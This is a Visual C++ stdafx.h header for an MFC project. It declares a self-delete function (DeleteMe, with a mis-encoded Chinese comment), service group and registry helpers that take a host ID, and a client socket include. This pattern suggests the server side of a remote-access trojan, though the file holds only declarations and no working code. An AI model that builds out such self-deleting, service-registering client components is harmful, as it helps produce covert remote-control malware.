// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#if !defined(AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_)
#define AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// #define _WIN32_WINNT 0x0500

#include <afxwin.h>
#include "afxinet.h"
// Insert your headers here
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#include <stdio.h>
//#include <windows.h>
//#include "MyFunc.h"

#include "ClientSocket.h"
#include <shlwapi.h>

#pragma comment(lib,"shlwapi.lib")
BOOL DeleteMe();  // ×ÔÉ¾³ý

void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName);  //ÐÞ¸Ä·Ö×é
void WriteRegExg(LPCTSTR lpServiceName,LPTSTR lpSame,LPCTSTR lpHostID);

#pragma comment(lib,"./uuid.lib")

// TODO: reference additional headers your program requires here

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_)
